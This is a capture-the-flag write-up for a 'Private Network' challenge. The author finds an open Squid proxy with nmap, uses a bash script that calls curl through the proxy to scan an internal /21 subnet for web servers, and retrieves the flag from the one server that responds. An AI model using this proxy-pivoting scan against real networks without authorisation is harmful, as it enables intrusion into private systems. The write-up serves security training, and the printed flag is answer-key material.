# Private Network

Hi Expert,

the archaeologists have found some network scheme (we suppose that mentioning the ancient cave painting was just a joke) and they think that there exists some very important web server in network `10.20.32.0/21`. The same scheme indicates that IP address `78.128.216.8` should be used to get access to private network. Get the data from above mentioned web server.

Good Luck!

---

Scan the host:
```
$ nmap 78.128.216.8
..
PORT     STATE SERVICE
3128/tcp open  squid-http
```

[Squid](http://www.squid-cache.org/) is a caching proxy. We can use it to get access into the private network.

Based on the challenge description, we are looking for a web server.
There are 2048 IP addresses to scan (subnet mask is `/21`).
I [converted the CIDR notation](http://magic-cookie.co.uk/iplist.html) to a range of IP addresses:
```
10.20.32.0
10.20.32.1
10.20.32.2
10.20.32.3
10.20.32.4
..
10.20.39.254
10.20.39.255
```

File [ips.txt](ips.txt) contains all the IPs.

Next, I created a simple bash script to check for a running web server on each IP:
```shell
#!/bin/bash
# scan-ips.sh

cat ips.txt | while read ip
do 
  http_code=$(curl -s -o /dev/null -w "%{http_code}\n" --proxy http://78.128.216.8:3128 http://$ip/)
  if [ $http_code -ne 403 ]; then
       echo "$ip: $http_code"
  fi
done
```

The important part is to use _curl_ with the proxy server.

Run the script:
```
$ ./scan-ips.sh
10.20.35.11: 200
```

That looks good. Finally, call the server:
```
$ curl --proxy http://78.128.216.8:3128 10.20.35.11
<html>
        <h2> It took a long time, flag is FLAG{XG5T-WLWl-HqjH-2E7V}</h2>
</html>
```